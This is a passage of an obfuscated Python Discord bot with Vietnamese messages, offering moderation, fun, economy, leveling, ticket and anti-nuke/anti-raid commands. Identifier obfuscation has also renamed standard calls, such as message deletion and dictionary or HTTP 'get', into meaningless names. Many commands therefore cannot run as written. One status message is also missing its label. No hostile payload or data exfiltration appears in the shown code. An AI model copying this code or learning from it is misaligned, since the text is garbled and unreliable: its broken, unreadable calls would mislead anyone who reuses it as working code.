        lllll1l1lll1.add_field(name='📈 Progress', value=f'{l1ll11ll1l1l:.1f}%', inline=True)
        lllll1l1lll1.set_footer(text=f'Requested by {lll111lll1ll.author.name}')
        await lll111lll1ll.send(embed=lllll1l1lll1)

    @commands.command(name='serverinfo')
    async def ll11ll11l1l1(ll1l1lll1111, lll111111l1l):
        l11l111lll11 = lll111111l1l.guild
        l1ll11l1l1ll = discord.Embed(title=f'Server Info - {l11l111lll11.name}', color=52479, timestamp=ll1l11l1ll1l())
        if l11l111lll11.icon:
            l1ll11l1l1ll.set_thumbnail(url=l11l111lll11.icon.url)
        l1ll11l1l1ll.add_field(name='ID', value=l11l111lll11.id, inline=True)
        l1ll11l1l1ll.add_field(name='Owner', value=l11l111lll11.owner, inline=True)
        l1ll11l1l1ll.add_field(name='Members', value=l11l111lll11.member_count, inline=True)
        l1ll11l1l1ll.add_field(name='Channels', value=len(l11l111lll11.channels), inline=True)
        l1ll11l1l1ll.add_field(name='Roles', value=len(l11l111lll11.roles), inline=True)
        l1ll11l1l1ll.add_field(name='Created', value=l11l111lll11.created_at.strftime('%d/%m/%Y %H:%M'), inline=True)
        l1ll11l1l1ll.add_field(name='Boost Level', value=l11l111lll11.premium_tier, inline=True)
        l1ll11l1l1ll.add_field(name='Boost Count', value=l11l111lll11.premium_subscription_count, inline=True)
        l1ll11l1l1ll.set_footer(text=f'Requested by {lll111111l1l.author.name}')
        await lll111111l1l.send(embed=l1ll11l1l1ll)

    @commands.command(name='servericon')
    async def lllll11l11l1(ll1111lll11l, ll1l11l11lll):
        ll111l111ll1 = ll1l11l11lll.guild
        if not ll111l111ll1.icon:
            await ll1l11l11lll.send('❌ Server này không có icon.')
            return
        ll1ll11l1111 = discord.Embed(title=f'Server Icon - {ll111l111ll1.name}', color=52479)
        ll1ll11l1111.set_image(url=ll111l111ll1.icon.url)
        await ll1l11l11lll.send(embed=ll1ll11l1111)

    @commands.command(name='say')
    async def ll111l1111ll(ll111l1l1lll, llllll11llll, *, ll1l11111lll: str):
        await llllll11llll.message.lll1lll1l111()
        await llllll11llll.send(ll1l11111lll)

    @commands.command(name='embed')
    async def l111lllll1l1(llll11l11l1l, l1l1llll1ll1, ll11ll1lll1l: str, *, llll1l1111l1: str):
        ll11l111ll1l = discord.Embed(title=ll11ll1lll1l, description=llll1l1111l1, color=52479)
        await l1l1llll1ll1.send(embed=ll11l111ll1l)

    @commands.command(name='timer')
    async def lllll11lllll(lllll11llll1, l1llll111l11, l1ll11lll111: int):
        if l1ll11lll111 < 1 or l1ll11lll111 > 3600:
            await l1llll111l11.send('❌ Nhập số giây từ 1 đến 3600.')
            return
        await l1llll111l11.send(f'⏰ Timer set for {l1ll11lll111} seconds.')
        await asyncio.sleep(l1ll11lll111)
        await l1llll111l11.send(f"🔔 {l1llll111l11.author.mention} Time's up!")

    @commands.command(name='snipe')
    async def l11111lll111(l11l1ll1ll11, lll1l1l1111l):
        if lll1l1l1111l.channel.id not in snipe_cache:
            await lll1l1l1111l.send('ℹ️ Không có tin nhắn nào bị xóa gần đây.')
            return
        llllll11l111 = snipe_cache[lll1l1l1111l.channel.id]
        l1lll1l1llll = discord.Embed(title='🗑️ Sniped Message', description=llllll11l111['content'] if llllll11l111['content'] else '*No content*', color=52479, timestamp=llllll11l111['time'])
        l1lll1l1llll.set_author(name=llllll11l111['author'], icon_url=llllll11l111['avatar'])
        await lll1l1l1111l.send(embed=l1lll1l1llll)

    @commands.command(name='clear')
    @commands.has_permissions(manage_messages=True)
    async def llll1llll1l1(lll1111ll11l, llll11lll1ll, l11lll1ll1ll: int):
        if l11lll1ll1ll < 1 or l11lll1ll1ll > 100:
            await llll11lll1ll.send('❌ Nhập số từ 1 đến 100.')
            return
        await llll11lll1ll.message.lll1lll1l111()
        lll1l111ll11 = await llll11lll1ll.channel.purge(limit=l11lll1ll1ll)
        await llll11lll1ll.send(f'🧹 Deleted {len(lll1l111ll11)} messages.', delete_after=3)

    @commands.command(name='kick')
    @commands.has_permissions(kick_members=True)
    async def lllllll11lll(lll1ll1ll1l1, l1l111ll1l11, ll11l11ll11l: discord.Member, *, l1llll111ll1: str='No reason'):
        if ll11l11ll11l == l1l111ll1l11.author:
            await l1l111ll1l11.send("❌ You can't kick yourself!")
            return
        try:
            await ll11l11ll11l.kick(reason=l1llll111ll1)
            await l1l111ll1l11.send(f'✅ Kicked {ll11l11ll11l.mention}!\nReason: {l1llll111ll1}')
        except:
            await l1l111ll1l11.send('❌ Failed to kick member.')

    @commands.command(name='ban')
    @commands.has_permissions(ban_members=True)
    async def lll11l1l1lll(l11ll1l1111l, l111ll11111l, ll11111l1lll: discord.Member, *, ll1ll1l1111l: str='No reason'):
        if ll11111l1lll == l111ll11111l.author:
            await l111ll11111l.send("❌ You can't ban yourself!")
            return
        try:
            await ll11111l1lll.ban(reason=ll1ll1l1111l)
            await l111ll11111l.send(f'✅ Banned {ll11111l1lll.mention}!\nReason: {ll1ll1l1111l}')
        except:
            await l111ll11111l.send('❌ Failed to ban member.')

    @commands.command(name='unban')
    @commands.has_permissions(ban_members=True)
    async def l1ll1lll1ll1(l11111111l11, l1ll1l1111l1, l1111111l11l: int, *, l11l1111l1l1: str='No reason'):
        try:
            l1l11l11llll = await l11ll11l111l.fetch_user(l1111111l11l)
            await l1ll1l1111l1.guild.unban(l1l11l11llll, reason=l11l1111l1l1)
            await l1ll1l1111l1.send(f'✅ Unbanned {l1l11l11llll.mention}!\nReason: {l11l1111l1l1}')
        except:
            await l1ll1l1111l1.send('❌ Failed to unban user.')

    @commands.command(name='timeout')
    @commands.has_permissions(moderate_members=True)
    async def l1l1ll111l1l(l1lll111lll1, lll1lllllll1, l1lllll1l11l: discord.Member, l1lll11l111l: int, *, l111lll11l11: str='No reason'):
        if l1lll11l111l < 1 or l1lll11l111l > 40320:
            await lll1lllllll1.send('❌ Nhập số phút từ 1 đến 40320 (28 ngày).')
            return
        try:
            await l1lllll1l11l.timeout(timedelta(minutes=l1lll11l111l), reason=l111lll11l11)
            await lll1lllllll1.send(f'✅ Timed out {l1lllll1l11l.mention} for {l1lll11l111l} minutes!\nReason: {l111lll11l11}')
        except:
            await lll1lllllll1.send('❌ Failed to timeout member.')

    @commands.command(name='warn')
    @commands.has_permissions(manage_messages=True)
    async def l111llll1111(ll11l111llll, l1lllll1lll1, l11lllll1l11: discord.Member, *, l11l1l1111l1: str='No reason'):
        l11111l1l11l = llll1l1ll11l.l1ll1l1lllll(l11lllll1l11.id)
        if 'warnings' not in l11111l1l11l:
            l11111l1l11l['warnings'] = []
        l11111l1l11l['warnings'].append({'reason': l11l1l1111l1, 'mod': l1lllll1lll1.author.id, 'time': ll1l11l1ll1l().isoformat()})
        llll1l1ll11l.lllllll11ll1(f'user_{l11lllll1l11.id}', l11111l1l11l)
        await l1lllll1lll1.send(f'⚠️ Warned {l11lllll1l11.mention}!\nReason: {l11l1l1111l1}')

    @commands.command(name='warnings')
    async def ll1lllll11ll(l1llll1l111l, ll11llll11ll, ll1l11lll1ll: discord.Member=None):
        if ll1l11lll1ll is None:
            ll1l11lll1ll = ll11llll11ll.author
        l1lllll1llll = llll1l1ll11l.l1ll1l1lllll(ll1l11lll1ll.id)
        l1111l111ll1 = l1lllll1llll.l11111111l1l('warnings', [])
        if not l1111l111ll1:
            await ll11llll11ll.send(f'ℹ️ {ll1l11lll1ll.mention} has no warnings.')
            return
        l1ll1l111l1l = discord.Embed(title=f'Warnings for {ll1l11lll1ll.name}', color=16755200)
        for l1111l11l1l1, l1l111ll1lll in enumerate(l1111l111ll1[-5:], 1):
            l1ll1l111l1l.add_field(name=f'Warning #{l1111l11l1l1}', value=f"Reason: {l1l111ll1lll['reason']}\nMod: <@{l1l111ll1lll['mod']}>\nTime: {l1l111ll1lll['time']}", inline=False)
        await ll11llll11ll.send(embed=l1ll1l111l1l)

    @commands.command(name='coinflip')
    async def l1lll11l11l1(ll1111l1l111, l1l1l111l1l1):
        l1l111l1l11l = random.choice(['Heads', 'Tails'])
        ll1lll1l1111 = discord.Embed(title='🪙 Coin Flip', description=f'**{l1l111l1l11l}**', color=16755200)
        ll1lll1l1111.set_footer(text=f'Requested by {l1l1l111l1l1.author.name}')
        await l1l1l111l1l1.send(embed=ll1lll1l1111)

    @commands.command(name='8ball')
    async def lll11ll11l11(l1l1ll1111l1, lll1lll1111l, *, lll1llllllll: str):
        ll1l11l11111 = ['Chắc chắn.', 'Có lẽ là có.', 'Có lẽ là không.', 'Hỏi lại sau.', 'Không thể đoán được.', 'Tập trung và hỏi lại.', 'Đừng hỏi nữa.', 'Rất có thể.', 'Dấu hiệu cho thấy có.', 'Không.', 'Có.', 'Chưa thể trả lời.', 'Hôm nay không.', 'Ngày mai sẽ rõ.']
        l1l1l1111l11 = discord.Embed(title='🎱 Magic 8-Ball', description=f'**Câu hỏi:** {lll1llllllll}\n**Trả lời:** {random.choice(ll1l11l11111)}', color=65416)
        l1l1l1111l11.set_footer(text=f'Requested by {lll1lll1111l.author.name}')
        await lll1lll1111l.send(embed=l1l1l1111l11)

class Fun(commands.Cog):

    def __init__(ll11111lllll, ll1l111ll11l):
        ll11111lllll.bot = ll1l111ll11l

    @commands.command(name='rps')
    async def lllllll111l1(llll11l111l1, ll1l1lll1ll1, l11l1llll11l: str):
        l11111l1lll1 = ['rock', 'paper', 'scissors']
        if l11l1llll11l.lower() not in l11111l1lll1:
            await ll1l1lll1ll1.send('❌ Chọn `rock`, `paper` hoặc `scissors`.')
            return
        l11l1111l11l = random.choice(l11111l1lll1)
        l111l1l111ll = ''
        if l11l1llll11l.lower() == l11l1111l11l:
            l111l1l111ll = 'Draw!'
        elif l11l1llll11l.lower() == 'rock' and l11l1111l11l == 'scissors' or (l11l1llll11l.lower() == 'paper' and l11l1111l11l == 'rock') or (l11l1llll11l.lower() == 'scissors' and l11l1111l11l == 'paper'):
            l111l1l111ll = 'You win!'
        else:
            l111l1l111ll = 'You lose!'
        lll1l1l11l1l = discord.Embed(title='🎮 Rock-Paper-Scissors', color=16755200)
        lll1l1l11l1l.add_field(name='You', value=l11l1llll11l.capitalize(), inline=True)
        lll1l1l11l1l.add_field(name='Bot', value=l11l1111l11l.capitalize(), inline=True)
        lll1l1l11l1l.add_field(name='Result', value=l111l1l111ll, inline=True)
        await ll1l1lll1ll1.send(embed=lll1l1l11l1l)

    @commands.command(name='poll')
    async def l11lll1lllll(l111l1111ll1, ll11ll11l11l, lll1l11lllll: str, *, l1llll11l1l1: str):
        l11l1l1l1l1l = l1llll11l1l1.split('|')
        if len(l11l1l1l1l1l) < 2 or len(l11l1l1l1l1l) > 10:
            await ll11ll11l11l.send('❌ Nhập từ 2 đến 10 lựa chọn, cách nhau bởi `|`.')
            return
        ll1111ll11l1 = discord.Embed(title=f'📊 Poll: {lll1l11lllll}', color=52479)
        for l1111111l111, l1ll1ll1ll11 in enumerate(l11l1l1l1l1l, 1):
            ll1111ll11l1.add_field(name=f'Option {l1111111l111}', value=l1ll1ll1ll11.strip(), inline=False)
        ll1111ll11l1.set_footer(text=f'React to vote | Created by {ll11ll11l11l.author.name}')
        lll1l111l1l1 = await ll11ll11l11l.send(embed=ll1111ll11l1)
        for l1111111l111 in range(1, len(l11l1l1l1l1l) + 1):
            await lll1l111l1l1.add_reaction(f'{l1111111l111}️⃣')
        polls[lll1l111l1l1.id] = {'options': l11l1l1l1l1l, 'author': ll11ll11l11l.author.id, 'channel': ll11ll11l11l.channel.id}

    @commands.command(name='giveaway')
    async def ll1111ll1lll(l1111l1111ll, lll1lllll11l, ll11l1111l1l: int, *, l11lllll1111: str):
        if ll11l1111l1l < 10 or ll11l1111l1l > 3600:
            await lll1lllll11l.send('❌ Nhập thời gian từ 10 đến 3600 giây.')
            return
        l11lllll1lll = discord.Embed(title='🎁 Giveaway!', description=f'**Prize:** {l11lllll1111}\n**Duration:** {ll11l1111l1l}s\n**Hosted by:** {lll1lllll11l.author.mention}', color=16755200, timestamp=ll1l11l1ll1l())
        l11l1l11ll1l = await lll1lllll11l.send(embed=l11lllll1lll)
        await l11l1l11ll1l.add_reaction('🎉')
        giveaways[l11l1l11ll1l.id] = {'prize': l11lllll1111, 'duration': ll11l1111l1l, 'host': lll1lllll11l.author.id, 'channel': lll1lllll11l.channel.id, 'end_time': ll1l11l1ll1l() + timedelta(seconds=ll11l1111l1l)}
        await asyncio.sleep(ll11l1111l1l)
        l11l1l11ll1l = await lll1lllll11l.channel.fetch_message(l11l1l11ll1l.id)
        l11l1l111lll = await l11l1l11ll1l.reactions[0].users().flatten()
        l11l1l111lll = [ll1111111lll for ll1111111lll in l11l1l111lll if not ll1111111lll.bot]
        if l11l1l111lll:
            lll1l1llll11 = random.choice(l11l1l111lll)
            await lll1lllll11l.send(f'🎉 **Winner of {l11lllll1111}:** {lll1l1llll11.mention}! Congratulations!')
        else:
            await lll1lllll11l.send(f'❌ No one entered the giveaway for {l11lllll1111}.')

    @commands.command(name='endgiveaway')
    async def llll11llll1l(l111ll1l1111, ll1ll11ll1l1, l1111ll1llll: int):
        if l1111ll1llll not in giveaways:
            await ll1ll11ll1l1.send('❌ Giveaway not found!')
            return
        ll111111l1ll = giveaways[l1111ll1llll]
        l111l111l1l1 = l11ll11l111l.get_channel(ll111111l1ll['channel'])
        if not l111l111l1l1:
            await ll1ll11ll1l1.send('❌ Channel not found!')
            return
        ll1l1l1lllll = await l111l111l1l1.fetch_message(l1111ll1llll)
        l1llll1lll11 = await ll1l1l1lllll.reactions[0].users().flatten()
        l1llll1lll11 = [lll1l1l11lll for lll1l1l11lll in l1llll1lll11 if not lll1l1l11lll.bot]
        if l1llll1lll11:
            lll11ll1lll1 = random.choice(l1llll1lll11)
            await ll1ll11ll1l1.send(f"🎉 **Winner of {ll111111l1ll['prize']}:** {lll11ll1lll1.mention}!")
        else:
            await ll1ll11ll1l1.send(f'❌ No one entered the giveaway.')
        del giveaways[l1111ll1llll]

    @commands.command(name='meme')
    async def l11l11l111l1(ll11llllllll, l1ll111l1l1l):
        try:
            async with aiohttp.ClientSession() as l11ll11lll11:
                async with l11ll11lll11.l11111111l1l('https://meme-api.com/gimme') as l1l111l111ll:
                    if l1l111l111ll.status == 200:
                        l1l1ll11l11l = await l1l111l111ll.json()
                        l11l1ll111l1 = discord.Embed(title=l1l1ll11l11l.l11111111l1l('title', 'Meme'), color=16755200, timestamp=ll1l11l1ll1l())
                        l11l1ll111l1.set_image(url=l1l1ll11l11l.l11111111l1l('url'))
                        l11l1ll111l1.set_footer(text=f"👍 {l1l1ll11l11l.l11111111l1l('ups', 0)}")
                        await l1ll111l1l1l.send(embed=l11l1ll111l1)
                    else:
                        await l1ll111l1l1l.send('❌ Không thể lấy meme.')
        except:
            await l1ll111l1l1l.send('❌ Lỗi kết nối API meme.')

    @commands.command(name='gif')
    async def l111l1ll1l1l(l1l1l11ll1l1, lll1111lll1l, *, l1llll1l1ll1: str):
        try:
            async with aiohttp.ClientSession() as l11ll11111ll:
                l1l11l1lllll = f'https://api.giphy.com/v1/gifs/translate?api_key=dc6zaTOxFJmzC&s={l1llll1l1ll1}'
                async with l11ll11111ll.l11111111l1l(l1l11l1lllll) as l1ll1ll1l11l:
                    if l1ll1ll1l11l.status == 200:
                        l1l1l1l1111l = await l1ll1ll1l11l.json()
                        l111llllll11 = l1l1l1l1111l['data']['images']['original']['url']
                        l1l1l11llll1 = discord.Embed(title=f'🎞️ GIF: {l1llll1l1ll1}', color=52479, timestamp=ll1l11l1ll1l())
                        l1l1l11llll1.set_image(url=l111llllll11)
                        await lll1111lll1l.send(embed=l1l1l11llll1)
                    else:
                        await lll1111lll1l.send('❌ Không tìm thấy GIF.')
        except:
            await lll1111lll1l.send('❌ Lỗi kết nối API GIF.')

class EconomyCommands(commands.Cog):

    def __init__(l1l11lll1l1l, l1l11l1lll11):
        l1l11lll1l1l.bot = l1l11l1lll11

    @commands.command(name='balance', aliases=['bal'])
    async def lll111111lll(llll1lllllll, llll1l111111, lll1ll111lll: discord.Member=None):
        if lll1ll111lll is None:
            lll1ll111lll = llll1l111111.author
        l11ll1111ll1 = Economy.l1ll1l11llll(lll1ll111lll.id)
        ll11l1llll11 = discord.Embed(title=f'💰 Balance of {lll1ll111lll.name}', description=f'**Coins:** {ll1l111l1111(l11ll1111ll1)}', color=16766720, timestamp=ll1l11l1ll1l())
        ll11l1llll11.set_thumbnail(url=lll1ll111lll.display_avatar.url)
        await llll1l111111.send(embed=ll11l1llll11)

    @commands.command(name='daily')
    async def l1l1l11l11ll(l1llll1l1lll, l11llllllll1):
        l1llll1ll1ll = l11llllllll1.author.id
        l11l111l1l1l = llll1l1ll11l.l11111111l1l(f'daily_{l1llll1ll1ll}', 0)
        l11ll11ll1l1 = time.time()
        if l11ll11ll1l1 - l11l111l1l1l < 86400:
            l1l111l1ll11 = int(86400 - (l11ll11ll1l1 - l11l111l1l1l))
            await l11llllllll1.send(f'⏳ Bạn đã nhận daily rồi. Còn {l1l111l1ll11 // 3600}h {l1l111l1ll11 % 3600 // 60}m.')
            return
        l11lllll1l1l = random.randint(100, 500)
        Economy.lll1l1lll1ll(l1llll1ll1ll, l11lllll1l1l)
        llll1l1ll11l.set(f'daily_{l1llll1ll1ll}', l11ll11ll1l1)
        await l11llllllll1.send(f'✅ Bạn đã nhận **{l11lllll1l1l} coins** từ daily reward!')

    @commands.command(name='work')
    async def l11ll11ll111(llllll11l1l1, l111l11l111l):
        l111l111l111 = l111l11l111l.author.id
        lllll11l1ll1 = llll1l1ll11l.l11111111l1l(f'work_{l111l111l111}', 0)
        llllllll1lll = time.time()
        if llllllll1lll - lllll11l1ll1 < 60:
            l11lll11l1l1 = int(60 - (llllllll1lll - lllll11l1ll1))
            await l111l11l111l.send(f'⏳ Nghỉ ngơi chút đi, còn {l11lll11l1l1}s nữa mới làm tiếp.')
            return
        lll11ll11ll1 = random.randint(50, 200)
        Economy.lll1l1lll1ll(l111l111l111, lll11ll11ll1)
        llll1l1ll11l.set(f'work_{l111l111l111}', llllllll1lll)
        ll11l11l1lll = ['👨\u200d💻 viết code', '🧹 dọn dẹp server', '☕ pha cà phê', '🐛 fix bug', '📝 viết báo cáo', '🛠️ sửa bot']
        l111l1l1111l = random.choice(ll11l11l1lll)
        await l111l11l111l.send(f'✅ Bạn vừa {l111l1l1111l} và nhận được **{lll11ll11ll1} coins**!')

    @commands.command(name='shop')
    async def l11l1l1ll1ll(ll111l1ll1l1, l1111lll1lll):
        ll111l1l1111 = discord.Embed(title='🏪 LUNAL SHOP', color=16766720, timestamp=ll1l11l1ll1l())
        for l111l111l1ll, l1lllll11lll in shop_items.items():
            ll111l1l1111.add_field(name=l1lllll11lll['name'], value=f"Price: {ll1l111l1111(l1lllll11lll['price'])} coins\n{l1lllll11lll['desc']}\n`l!buy {l111l111l1ll}`", inline=False)
        await l1111lll1lll.send(embed=ll111l1l1111)

    @commands.command(name='buy')
    async def l1lllll1ll1l(l11llll11l1l, ll1ll11ll11l, lllll1ll1ll1: str):
        ll111l1lllll = shop_items.l11111111l1l(lllll1ll1ll1.lower())
        if not ll111l1lllll:
            await ll1ll11ll11l.send('❌ Item không tồn tại. Xem `l!shop`.')
            return
        if not Economy.l1ll1l1l11ll(ll1ll11ll11l.author.id, ll111l1lllll['price']):
            await ll1ll11ll11l.send(f"❌ Không đủ tiền! Giá: {ll1l111l1111(ll111l1lllll['price'])} coins.")
            return
        Economy.ll1l1l11ll1l(ll1ll11ll11l.author.id, lllll1ll1ll1.lower())
        await ll1ll11ll11l.send(f"✅ Bạn đã mua **{ll111l1lllll['name']}** thành công!")

    @commands.command(name='inventory')
    async def l1l1lll1l1ll(ll1ll1l1l11l, ll1l1lll1lll, lllll111l1l1: discord.Member=None):
        if lllll111l1l1 is None:
            lllll111l1l1 = ll1l1lll1lll.author
        l111ll111lll = Economy.l11l1llll1ll(lllll111l1l1.id)
        if not l111ll111lll:
            await ll1l1lll1lll.send(f'ℹ️ {lllll111l1l1.name} chưa có item nào.')
            return
        l11ll111lll1 = {'vip': '⭐ VIP Role', 'color': '🎨 Color Role', 'boost': '🚀 XP Boost'}
        l1l1l1l11111 = '\n'.join([f'• {l11ll111lll1.l11111111l1l(ll111lll1ll1, ll111lll1ll1)}' for ll111lll1ll1 in l111ll111lll])
        lll1l1lll1l1 = discord.Embed(title=f'🎒 Inventory of {lllll111l1l1.name}', description=l1l1l1l11111, color=16766720, timestamp=ll1l11l1ll1l())
        await ll1l1lll1lll.send(embed=lll1l1lll1l1)

class LevelCommands(commands.Cog):

    def __init__(llllllll11l1, l1111ll11l11):
        llllllll11l1.bot = l1111ll11l11

    @commands.command(name='level')
    async def llllll1l111l(l11ll1llllll, llllllll1111, lllll1111ll1: discord.Member=None):
        if lllll1111ll1 is None:
            lllll1111ll1 = llllllll1111.author
        ll1111l1llll = lllll1111ll1.id
        ll1l1lll11l1 = LevelSystem.l111l1l1ll1l(ll1111l1llll)
        l11111111lll = LevelSystem.lll11ll1l11l(ll1111l1llll)
        llllll1l1111 = LevelSystem.l11l11l11111(l11111111lll)
        lll11ll1ll11 = ll1l1lll11l1 / llllll1l1111 * 100 if llllll1l1111 > 0 else 0
        lll1l1lll111 = discord.Embed(title=f'📊 Level of {lllll1111ll1.name}', color=65416, timestamp=ll1l11l1ll1l())
        lll1l1lll111.set_thumbnail(url=lllll1111ll1.display_avatar.url)
        lll1l1lll111.add_field(name='Level', value=l11111111lll, inline=True)
        lll1l1lll111.add_field(name='XP', value=f'{ll1l111l1111(ll1l1lll11l1)} / {ll1l111l1111(llllll1l1111)}', inline=True)
        lll1l1lll111.add_field(name='Progress', value=f'{lll11ll1ll11:.1f}%', inline=True)
        lll1l1lll111.add_field(name='📈 Progress Bar', value=f"`{int(lll11ll1ll11 // 5) * '█'}{'░' * (20 - int(lll11ll1ll11 // 5))}`", inline=False)
        lll1l1lll111.set_footer(text=f'Requested by {llllllll1111.author.name}')
        await llllllll1111.send(embed=lll1l1lll111)

    @commands.command(name='rank')
    async def lll11l1l1ll1(ll1l11ll1l1l, l1l1l1ll1l1l):
        l1111l1l1l11 = {str(lll1l111ll1l.id) for lll1l111ll1l in l1l1l1ll1l1l.guild.members if not lll1l111ll1l.bot}
        ll1lllll1l11 = []
        for ll1l1ll1llll, llllll11lll1 in llll1l1ll11l.data.items():
            if ll1l1ll1llll.startswith('user_'):
                llll1lll1111 = int(ll1l1ll1llll.split('_')[1])
                if str(llll1lll1111) in l1111l1l1l11:
                    ll1lllll1l11.append((llll1lll1111, llllll11lll1.l11111111l1l('xp', 0), llllll11lll1.l11111111l1l('level', 1)))
        llllll111l11 = sorted(ll1lllll1l11, key=lambda x: x[1], reverse=True)[:10]
        l11l11ll111l = discord.Embed(title='🏆 LUNAL LEADERBOARD', color=16766720, timestamp=ll1l11l1ll1l())
        lll11l11l1l1 = ''
        for l1l1l1lllll1, (llll1lll1111, l11l1l1ll1l1, llll111l1lll) in enumerate(llllll111l11, 1):
            try:
                ll1l1l1llll1 = l1l1l1ll1l1l.guild.get_member(llll1lll1111)
                l1llll1ll111 = ll1l1l1llll1.display_name if ll1l1l1llll1 else f'User {llll1lll1111 % 10000}'
            except:
                l1llll1ll111 = f'User {llll1lll1111 % 10000}'
            l1lll1l11lll = '🥇' if l1l1l1lllll1 == 1 else '🥈' if l1l1l1lllll1 == 2 else '🥉' if l1l1l1lllll1 == 3 else '🔹'
            lll11l11l1l1 += f'{l1lll1l11lll} **#{l1l1l1lllll1}** {l1llll1ll111} — Lv.{llll111l1lll} (XP: {ll1l111l1111(l11l1l1ll1l1)})\n'
        l11l11ll111l.description = lll11l11l1l1 or 'Chưa có ai tham gia.'
        await l1l1l1ll1l1l.send(embed=l11l11ll111l)

class Ticket(commands.Cog):

    def __init__(llll1l1lll1l, lll111l1l11l):
        llll1l1lll1l.bot = lll111l1l11l

    @commands.command(name='ticket')
    async def l1ll11lll1ll(l11llll11lll, l1l1111l1ll1, *, l1l1111l1l1l: str='No reason'):
        l1lllll1l1ll = l1l1111l1ll1.guild
        l11l1l1111ll = discord.utils.l11111111l1l(l1lllll1l1ll.categories, name='Tickets')
        if not l11l1l1111ll:
            l11l1l1111ll = await l1lllll1l1ll.create_category('Tickets')
        lll1l111lll1 = f"ticket-{l1l1111l1ll1.author.name.lower().replace(' ', '-')}"
        ll1l1ll111l1 = {l1lllll1l1ll.default_role: discord.PermissionOverwrite(view_channel=False), l1l1111l1ll1.author: discord.PermissionOverwrite(view_channel=True, send_messages=True), l1lllll1l1ll.me: discord.PermissionOverwrite(view_channel=True, send_messages=True)}
        ll111l111lll = await l1lllll1l1ll.create_text_channel(lll1l111lll1, category=l11l1l1111ll, overwrites=ll1l1ll111l1)
        lllllll1l111 = discord.Embed(title='🎫 Ticket Created', description=f'Reason: {l1l1111l1l1l}\nUse `l!close` to close this ticket.', color=10181046, timestamp=ll1l11l1ll1l())
        await ll111l111lll.send(f'{l1l1111l1ll1.author.mention}', embed=lllllll1l111)
        tickets[ll111l111lll.id] = {'author': l1l1111l1ll1.author.id, 'reason': l1l1111l1l1l}
        await l1l1111l1ll1.send(f'✅ Ticket created: {ll111l111lll.mention}', delete_after=5)

    @commands.command(name='close')
    async def l1l1llll1l1l(l11l11lll111, l1lll1lll1l1):
        if l1lll1lll1l1.channel.id not in tickets:
            await l1lll1lll1l1.send('❌ Đây không phải là ticket.')
            return
        await l1lll1lll1l1.channel.send('🔒 Closing ticket in 5 seconds...')
        await asyncio.sleep(5)
        await l1lll1lll1l1.channel.lll1lll1l111()

class Anti(commands.Cog):

    def __init__(lll1l1ll1l1l, l11ll1111l1l):
        lll1l1ll1l1l.bot = l11ll1111l1l

    def l1l1111l11ll(l1111ll111ll, ll1l1ll11ll1: int) -> dict:
        lll1l1l1llll = f'anti_{ll1l1ll11ll1}'
        l1l1111111ll = llll1l1ll11l.l11111111l1l(lll1l1l1llll)
        if l1l1111111ll is None:
            l1l1111111ll = {'antinuke': False, 'antiraid': False, 'antibot': False, 'log_channel': None, 'raid_threshold': 5, 'raid_time': 5, 'whitelist': []}
            llll1l1ll11l.set(lll1l1l1llll, l1l1111111ll)
            l111l1l1l111(f'Tạo config anti mới cho server {ll1l1ll11ll1}', 'INFO')
        return l1l1111111ll

    def l1l1ll1ll11l(l11l1llll1l1, lll1l1l1l111: int, l11l1l11llll: dict):
        llllll1llll1 = f'anti_{lll1l1l1l111}'
        llll1l1ll11l.set(llllll1llll1, l11l1l11llll)
        l111l1l1l111(f'Đã lưu config anti cho server {lll1l1l1l111}: {l11l1l11llll}', 'INFO')

    @commands.command(name='antinuke')
    @commands.has_permissions(administrator=True)
    async def lllll11l1111(lll11ll1llll, l1ll11l1ll11, llll11llllll: str=None):
        l1l1llll1lll = lll11ll1llll.l1l1111l11ll(l1ll11l1ll11.guild.id)
        if llll11llllll is None:
            l111l1l1llll = discord.Embed(title='🛡️ Anti-Nuke Status', description=f"Trạng thái: **{('🟢 BẬT' if l1l1llll1lll['antinuke'] else '🔴 TẮT')}**", color=65416 if l1l1llll1lll['antinuke'] else 16729156, timestamp=ll1l11l1ll1l())
            l111l1l1llll.set_footer(text=f'Lệnh bởi {l1ll11l1ll11.author.name}')
            await l1ll11l1ll11.send(embed=l111l1l1llll)
            return
        if llll11llllll.lower() in ['on', 'bật', 'true', '1']:
            l1l1llll1lll['antinuke'] = True
            l1llllll11ll = '🛡️ **Anti-Nuke đã được BẬT!**'
        elif llll11llllll.lower() in ['off', 'tắt', 'false', '0']:
            l1l1llll1lll['antinuke'] = False
            l1llllll11ll = '🛡️ **Anti-Nuke đã được TẮT.**'
        else:
            await l1ll11l1ll11.send('❌ Vui lòng nhập `on` hoặc `off`.\nVí dụ: `l!antinuke on`')
            return
        lll11ll1llll.l1l1ll1ll11l(l1ll11l1ll11.guild.id, l1l1llll1lll)
        l111l1l1llll = discord.Embed(title='🛡️ Anti-Nuke', description=l1llllll11ll, color=65416 if l1l1llll1lll['antinuke'] else 16755200, timestamp=ll1l11l1ll1l())
        l111l1l1llll.set_footer(text=f'Lệnh bởi {l1ll11l1ll11.author.name}')
        await l1ll11l1ll11.send(embed=l111l1l1llll)

    @commands.command(name='antiraid')
    @commands.has_permissions(administrator=True)
    async def l1l1l11ll11l(l1lll111llll, l11ll1ll111l, l11ll1111l11: str=None):
        llll111111l1 = l1lll111llll.l1l1111l11ll(l11ll1ll111l.guild.id)
        if l11ll1111l11 is None:
            l1l11l11lll1 = discord.Embed(title='🛡️ Anti-Raid Status', description=f"Trạng thái: **{('🟢 BẬT' if llll111111l1['antiraid'] else '🔴 TẮT')}**\nNgưỡng: `{llll111111l1['raid_threshold']}` tin nhắn trong `{llll111111l1['raid_time']}` giây", color=65416 if llll111111l1['antiraid'] else 16729156, timestamp=ll1l11l1ll1l())
            l1l11l11lll1.set_footer(text=f'Lệnh bởi {l11ll1ll111l.author.name}')
            await l11ll1ll111l.send(embed=l1l11l11lll1)
            return
        if l11ll1111l11.lower() in ['on', 'bật', 'true', '1']:
            llll111111l1['antiraid'] = True
            l1l1lll111ll = '🛡️ ** đã được BẬT!**'
        elif l11ll1111l11.lower() in ['off', 'tắt', 'false', '0']:
            llll111111l1['antiraid'] = False
            l1l1lll111ll = '🛡️ **Anti-Raid đã được TẮT.**'
        else:
            await l11ll1ll111l.send('❌ Vui lòng nhập `on` hoặc `off`.\nVí dụ: `l!antiraid on`')
            return
        l1lll111llll.l1l1ll1ll11l(l11ll1ll111l.guild.id, llll111111l1)
        l1l11l11lll1 = discord.Embed(title='🛡️ Anti-Raid', description=l1l1lll111ll, color=65416 if llll111111l1['antiraid'] else 16755200, timestamp=ll1l11l1ll1l())
        l1l11l11lll1.set_footer(text=f'Lệnh bởi {l11ll1ll111l.author.name}')
